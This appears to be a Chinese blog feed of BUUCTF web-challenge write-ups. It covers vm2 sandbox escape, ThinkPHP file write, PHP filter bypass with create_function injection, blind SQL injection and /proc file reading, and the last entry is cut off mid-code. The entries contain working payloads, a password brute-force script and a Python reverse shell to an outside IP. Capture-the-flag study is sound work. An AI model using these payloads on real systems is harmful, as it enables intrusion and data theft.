    <content type="html"><![CDATA[<h2 id="js-vm2"><a href="#js-vm2" class="headerlink" title="js vm2"></a>js vm2</h2><p><img src="https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png" alt="01.png">      </p><p>下面两个demo     </p><p>看下<code>run.php</code>     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">array_key_exists</span><span class="token punctuation">(</span> <span class="token double-quoted-string string">"code"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token single-quoted-string string">'code'</span> <span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token keyword">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>试了下，感觉什么都执行不了     </p><p>前面提示说<code>真的是 PHP 嘛</code><br>难道不是PHP      </p><p>看下WP   </p><p>是js      </p><p>js还不会，先简单记一下吧，等学学再回来看看     </p><p><a href="https://www.anquanke.com/post/id/207291"><code>js  vm2沙箱逃逸</code></a>      </p><p>payload:   </p><pre><code>code = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(code));&#125;catch(x)&#123;    console.log(x);&#125;</code></pre><p>绕过：<code>[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]</code>      </p><pre><code>?code=(function ()&#123;    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();    try&#123;        Object.preventExtensions(Buffer.from(``)).a = 1;    &#125;catch(e)&#123;        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();    &#125;&#125;)()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyThinking</title>
    <link href="/2021/04/24/BUU75/"/>
    <url>/2021/04/24/BUU75/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-_-"></a>-_-</h2><p>看到thinking应该想到应该是thinkphp吧<br>输入个不存在的路径<br>报错：       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png" alt="01.png">     </p><p><a href="https://paper.seebug.org/1114/">Think PHP V6.0.0任意文件操作漏洞</a>       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png" alt="02.png">    </p><p>32位的PHPSESSID改成一个32位的PHP文件名  </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png" alt="03.png">      </p><p>搜索里面填入一句话      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png" alt="04.png"><br>就会被存放到之前写的文件里面<br>访问<code>http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php</code><br>最后的文件名是<code>sess_</code>+刚才的32位    </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png" alt="05.png">      </p><p>还要绕过<code>disable_function</code><br>和之前那道题一样        </p><p>我的蚁剑出问题了      </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105160796/">之后</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EzPHP</title>
    <link href="/2021/04/23/BUU74/"/>
    <url>/2021/04/23/BUU74/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-*-"></a>-*-</h2><p>代码审计    </p><pre><code>```php &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = &quot;1nD3x.php&quot;;$shana = $_GET[&#39;shana&#39;];$passwd = $_GET[&#39;passwd&#39;];$arg = &#39;&#39;;$code = &#39;&#39;;echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125; if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?```     </code></pre><p>首先第一层：      </p><pre><code>if($_SERVER) &#123;     if (        preg_match(&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])        )          die(&#39;You seem to want to do something bad?&#39;); &#125;</code></pre><p>url编码可以绕过，<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>接受？后的，不会对其url解码     </p><p>第二层：       </p><pre><code>if (!preg_match(&#39;/http|https/i&#39;, $_GET[&#39;file&#39;])) &#123;    if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) &#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#39;fxck you! What do you want to do ?!&#39;);     </code></pre><p>第二个匹配可以最后加%0a绕过      </p><p>第三层：</p><pre><code>if($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))              die(&#39;fxck you! I hate English!&#39;);     &#125; &#125;</code></pre><p>绕过<code>$_REQUEST</code><br><code>$_REQUEST 同时接受 GET 和 POST 的数据，并且 POST 具有更高的优先值</code><br>所以可以POST数字来绕过<br><code>POST：debu=1&amp;&amp;file=1 </code>   </p><pre><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);         </code></pre><p>data协议<code>data://text/plain,debu_debu_aqua</code><br><code>debu_debu_aqua</code>记得URL编码        </p><p>第四层：     </p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);&#125;       </code></pre><p>数组绕过     </p><p><code>shana[]=1&amp;passwd[]=2</code><br>URL编码     </p><p>第五层：    </p><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;       </code></pre><p>$code和$arg可以通过<code>extract($_GET[&quot;flag&quot;]);</code>传入     </p><p><code>creat_function()</code>函数       </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/163792/4/20511/6856/6082e575Ef04fe2e5/514edbaaa03f01e8.png" alt="01.png">      </p><pre><code>$func=creat_function(&#39;$a,$b&#39;,&#39;return $a*$b;&#39;);func()  就相当于    function func($a,$b)&#123;    return $a*$b;&#125;  </code></pre><p>如果参数可控，我们就可以通过<code>&#125;</code>提前结束函数，执行其他语句</p><pre><code>$func=creat_function(&#39;$a,$b&#39;,&#39;return $a*$b;&#125;eval(system(&#39;ls&#39;));//&#39;);   function func($a,$b)    &#123;        return $a*$b;&#125;        eval(system(&#39;ls&#39;));//&#125;</code></pre><p>flag[code]=create_function<br>%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E<br>flag[arg]=;}a();//<br>%66%6C%61%67%5B%61%72%67%5D=    </p><p><code>get_defined_vars()</code>函数会以数组形式返回所有变量和值<br><code>flag[code]=create_function&amp;flag[arg]=;&#125;var_dump(get_defined_vars());//</code><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/163461/36/20309/34836/6082eb4cE5ed6382e/e08bdbff0aa587d8.png" alt="02.png"><br><code>require</code>读取文件<br><code>flag[arg]=;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</code><br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/183003/35/675/45335/6082ec64E4b186153/4b8afb83d9a49b77.png" alt="03.png"><br>这个是假的<br>要用伪协议，URL取反    </p><p><code>;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173695/38/6129/110660/6082ef53Eed0617a1/19b0d876457d7346.png" alt="04.png">       </p><p><a href="https://www.gem-love.com/ctf/770.html">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLi</title>
    <link href="/2021/04/22/BUU73/"/>
    <url>/2021/04/22/BUU73/</url>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=".`."></a>.`.</h2><p><img src="https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg" alt="01.png">      </p><p><code>robots.txt</code>     </p><pre><code>User-agent: *Disallow: /hint.txt      </code></pre><p><code>hint.txt</code>      </p><pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#39;passwd&#39;] === admin&#39;s password,Then you will get the flag;     </code></pre><p>regexp正则注入<br><code>regexp</code>函数，匹配字符      </p><p><img src="https://s.pc.qq.com/tousu/img/20210422/1627861_1619091624.jpg" alt="02.png">         </p><p>单引号被过        </p><p>用<code>\</code>转义username的单引号，passwd后接<code>||</code>(或)         </p><p>payload:<code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>     </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parsepasswd <span class="token operator">=</span> <span class="token string">''</span>string<span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'_'</span>    <span class="token comment">#小写字母加数字加_</span>url <span class="token operator">=</span> <span class="token string">'http://83eb23d8-2065-4521-9970-018a0b4ce880.node3.buuoj.cn/index.php'</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> string<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span>            <span class="token string">"passwd"</span><span class="token punctuation">:</span><span class="token string">"||/**/passwd/**/regexp/**/\"^&#123;&#125;\";&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>passwd<span class="token operator">+</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token string">'%00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">##parse.unquote进行url解码，不解码直接弄不行</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'welcome'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            passwd <span class="token operator">+=</span> m            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> m<span class="token operator">==</span><span class="token string">'_'</span> <span class="token keyword">and</span> <span class="token string">'welcome'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span></code></pre></code></pre><p><img src="https://s.pc.qq.com/tousu/img/20210422/1945636_1619091932.jpg" alt="03.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PicDown</title>
    <link href="/2021/04/18/BUU72/"/>
    <url>/2021/04/18/BUU72/</url>
    
    <content type="html"><![CDATA[<h2 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h2><p><img src="https://ae03.alicdn.com/kf/Uce6df5309dde4da49889e468a001b3c4b.jpg" alt="01.png">      </p><p>随便输，url变成了<code>http://7a97406b-5c95-46e4-be43-8311778ca05e.node3.buuoj.cn/?url=127.0.0.1</code><br>看到url，以为是ssrf,试了几下，感觉不是，看了wp       </p><p>是任意文件读取，甚至不需要目录穿越<img src="https://ae04.alicdn.com/kf/U6f624042f7c74f188c65470ebb0687d0j.jpg" alt="02.png">        </p><p>直接读<code>/flag</code>可以读出来         </p><p><code>/proc目录</code>      </p><p>Linux上的<code>/proc目录</code>是一种虚拟文件系统，存储的是当前内核运行状态的一系列文件，也就是进程的信息<br>每个进程都有一个ID         </p><p><img src="https://ae02.alicdn.com/kf/U555898227cde48a2b6d2420930eef73f4.jpg" alt="03.png">       </p><p>我们看一下1进程下       </p><p><img src="https://ae03.alicdn.com/kf/U2af9107ac917499d97778f87a30fbcbdM.jpg" alt="04.png">         </p><p><code>/cmdline</code>文件存储着启动当前进程的完整命令<br><img src="https://ae03.alicdn.com/kf/Uf71910986c3d4a0ebe9e98d3d0a57d12z.jpg" alt="05.png">      </p><p><code>/proc/self 表示当前进程目录</code>    </p><p>回到题上，看一下当前进程的命令<code>url=/proc/self/cmdline</code><br><img src="https://ae03.alicdn.com/kf/U96555e477ec64b21977950e508bfc592L.jpg" alt="06.png">       </p><p>读一下<code>app.py</code>       </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> os<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre></code></pre><p>在<code>/no_one_know_the_manager</code>路由下<br>get到的key==SECRET_KEY就能执行命令了         </p><p>得到SECRET_KEY       </p><p><code>/proc/self/fd</code><br>fd这个目录里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。       </p><p><strong>如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（如<code>os.remove(SECRET_FILE)</code>）删除这个文件之后，在 <code>/proc</code> 这个进程的 <code>pid</code> 目录下的 <code>fd</code> 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong>          </p><p>所以读取<code>/proc/self/fd/1</code><br>对1爆破，当为3时，长度不一样<br><img src="https://ae02.alicdn.com/kf/Ub2f3a30c5fcd4cc69104781da2a8dc3ey.jpg" alt="07.png">        </p><p>需要将SECRET_KEY url编码一下<br><img src="https://ae02.alicdn.com/kf/U77030cdb74d544d190193eb79ca4157aN.jpg" alt="08.png">       </p><p>因为system没有回显，所以需要反弹shell       </p><pre><code>python -c &quot;importos,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre><p>python反弹shell，同样url编码       </p><p><a href="https://blog.csdn.net/qq_45521281/article/details/114594402?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Encode_and_encode</title>
    <link href="/2021/04/16/BUU71/"/>
    <url>/2021/04/16/BUU71/</url>
    
    <content type="html"><![CDATA[<h2 id="c—-a—-i"><a href="#c—-a—-i" class="headerlink" title="c—-a—-i"></a>c—-a—-i</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// no path traversal</span>    <span class="token single-quoted-string string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment">// no stream wrapper</span>    <span class="token single-quoted-string string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment">// no data exfiltration</span>    <span class="token single-quoted-string string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span 